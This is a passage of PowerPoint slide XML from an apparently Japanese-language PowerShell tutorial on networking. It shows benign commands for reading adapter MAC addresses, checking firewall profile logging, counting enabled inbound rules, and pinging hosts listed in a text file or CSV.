                <a:t>InterfaceAlias</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>, IPv4Address,</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt;&gt; @{Name = '</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>MacAddress</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>'</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>&gt;&gt;   Expr = {$_.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="FFC000"/>
                  </a:solidFill>
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>NetAdapter.LinkLayerAddress</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>.</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:solidFill>
                    <a:srgbClr val="92D050"/>
                  </a:solidFill>
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>ToLower</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:solidFill>
                    <a:srgbClr val="92D050"/>
                  </a:solidFill>
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>().Replace('-',':')</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>}</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>}</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>InterfaceAlias</a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t> IPv4Address </a:t>
              </a:r>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>MacAddress</a:t>
              </a:r>
              <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>-------------- ----------- ----------</a:t>
              </a:r>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                  <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
                </a:rPr>
                <a:t>Ethernet       {10.10.0.1} 00:0c:29:43:da:11</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="21" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2EEDAC0A-298A-4A18-9DFB-ACB8FEFE2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3882534"/>
            <a:ext cx="10836326" cy="7925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solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>緑字部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で「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00-0C-29-43-DA-11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」を小文字＋コロン区切りに置換した。</a:t>
            </a:r>
          </a:p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""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 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|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 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Get-Member -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>MemberType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 Method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で、文字列操作一覧を確認可。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="32775349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F8EA2E56-B37D-78C8-F10B-4CEBD0A2A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ネットワーク </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイアウォール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79B5F6F-91A7-8655-3348-3EE4F79C56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5B2B98-D3CE-7987-3F5A-6D555C96DE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24</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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085072C5-A9E5-3F09-F78A-DF510C92B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930206"/>
            <a:ext cx="10440989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各プロファイルのログ取得設定を確認する。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602B10E-390C-99C0-8632-13C1C9AC58B1}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875421" y="1268760"/>
            <a:ext cx="7740860" cy="2400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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetFirewallProfile</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -Profile *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Select-Object Name, Enabled, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogAllowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogBlocked</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> 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Name    Enabled </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogAllowed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>LogBlocked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----    ------- ---------- ----------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Domain     True      False      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>False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Private    True      False      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>False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Public     True      False      </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>False</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
              <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="9" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{998DCD72-631A-98E9-AAD5-ED73CC9493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986340"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8760297" y="944724"/>
          <a:ext cx="2556283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6283">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Cmdlet - </a:t>
                      </a:r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NetSecurity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14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Get-</a:t>
                      </a:r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NetFirewallProfile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033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Get-</a:t>
                      </a:r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NetFirewallRule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6919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i="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Show-</a:t>
                      </a:r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NetFirewallRule</a:t>
                      </a:r>
                      <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="2000" i="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447962"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame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C30528B-7883-8702-66D2-865AFD2166EB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="875421" y="4293096"/>
            <a:ext cx="7740860" cy="1938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Show-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetFirewallRule</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PolicyStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ActiveStore</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Where-Object {$_.Direction -eq "Inbound"}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Where-Object {$_.Enabled -eq "True"}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Measure-Object</a:t>
            </a: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Count    : 158</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>. . .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4F89FF21-25BA-642F-6B76-C777FC0CC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3954542"/>
            <a:ext cx="10440989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特定の条件を満たす活性状態のルールを集計する。</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:graphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="12" name="表 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4B7D6080-F7AA-0EA9-D9CF-CD82D85975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05016"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8760297" y="2708136"/>
          <a:ext cx="2556284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6284">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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Get-</a:t>
                      </a:r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NetFirewall</a:t>
                      </a:r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*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14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AddressFilter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033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PortFilter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6919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ApplicationFilter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44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ServiceFilter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194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InterfaceFilter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067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InterfaceTypeFilter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209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SecurityFilter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722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27951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5D6B80-767A-AAA9-E110-277DE0D3F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ネットワーク</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>外部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイルの利用（パイプの値渡し）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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8ACBACD-A4A3-5089-04D7-4A10D5FA0F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8DF58D3-47CD-7E14-6E98-30B2D58861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25</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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AC2B130B-5374-A3F9-D751-72CFE7521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915867"/>
            <a:ext cx="9900221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Ping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対象を書いたテキストファイルを読み込んで、実行する。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82D88D1-A7FB-8A72-D33A-527888765021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1358766"/>
            <a:ext cx="7911309" cy="20928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Get-Content ./ips.txt | Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetConnection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> |</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>&gt;&gt; Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PingSucceeded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br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>PingSucceeded</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>------------ -------------</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>8.8.8.8      True</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>1.1.1.1      True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4F8A6547-E25A-BE2D-996D-F5B1A51D2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977676"/>
              </p:ext>
            </p:extLst>
          </p:nvPr>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8976320" y="1324534"/>
          <a:ext cx="216262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2629">
                  <a:extLst>
                    <a:ext uri="{9D8B030D-6E8A-4147-A177-3AD203B41FA5}">
                      <a16:colId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" val="2810130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ips.txt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14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sz="20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8.8.8.8</a:t>
                      </a:r>
                    </a:p>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" altLang="ja-JP" sz="20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1.1.1.1</a:t>
                      </a:r>
                      <a:endParaRPr lang="ja-JP" altLang="en-US" sz="200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370361"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
            </a:tbl>
          </a:graphicData>
        </a:graphic>
      </p:graphicFrame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4343E8A-FC2A-8FD4-FBCA-308BC7AE99DC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3527763" y="4329100"/>
            <a:ext cx="7787937" cy="190821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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1800" b="1" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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&lt;string&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="10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ja-JP" altLang="en-US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　必須　　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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true</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　位置　　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　既定値　　　　　　　　　　　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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None</a:t>
            </a:r>
            <a:endParaRPr lang="ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　パイプライン入力を許可する　　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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true (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ByValue</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ja-JP" sz="1800" b="0" i="0" u="none" strike="noStrike" baseline="0" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="000000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ByPropertyName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ja-JP" altLang="en-US" sz="18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ja-JP" altLang="en-US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　ワイルドカード文字を許可する　</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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true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ADFA8746-072B-9F08-5D9D-A74A7C1C6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3608583"/>
            <a:ext cx="8028014" cy="677108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Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>NetConnection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は、受け取ったオブジェクトを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en-US" altLang="ja-JP" sz="2200" dirty="0">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2200" dirty="0" err="1">
                <a:latin typeface="+mn-ea"/>
                <a:cs typeface="メイリオ" pitchFamily="50" charset="-128"/>
              </a:rPr>
              <a:t>ComputerName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パラメーターにマッピングさせる。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FD74205-2292-B609-BBE1-D6B5A8729370}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="3683732" y="5533466"/>
            <a:ext cx="7416824" cy="4086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854989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5D6B80-767A-AAA9-E110-277DE0D3F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ネットワーク</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>| </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>外部</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>ファイルの利用（パイプのプロパティ名渡し）</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1"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8ACBACD-A4A3-5089-04D7-4A10D5FA0F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8DF58D3-47CD-7E14-6E98-30B2D58861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26</a:t>
            </a:fld>
            <a:endParaRPr lang="ja-JP" altLang="en-US" dirty="0"/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AC2B130B-5374-A3F9-D751-72CFE7521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915867"/>
            <a:ext cx="9900221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Ping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対象を書いたヘッダー付きファイルを読み込んで、実行する。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82D88D1-A7FB-8A72-D33A-527888765021}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="884991" y="1358766"/>
            <a:ext cx="8559381" cy="30162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Get-Content ./domains.csv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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP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ConvertFrom</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>-Csv</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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</a:t>
            </a:r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</a:rPr>
              <a:t>Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>@{n = "</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="92D050"/>
                </a:solidFill>
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>"; e = {$_.Domain}}</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="20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2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Test-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>NetConnection</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>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Select-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>ComputerName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0">
                <a:latin typeface="Consolas" panose="020B0609020204030204" pitchFamily="49" charset="0"/>
              </a:rPr>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="ja-JP" sz="2000" dirty="0" err="1">
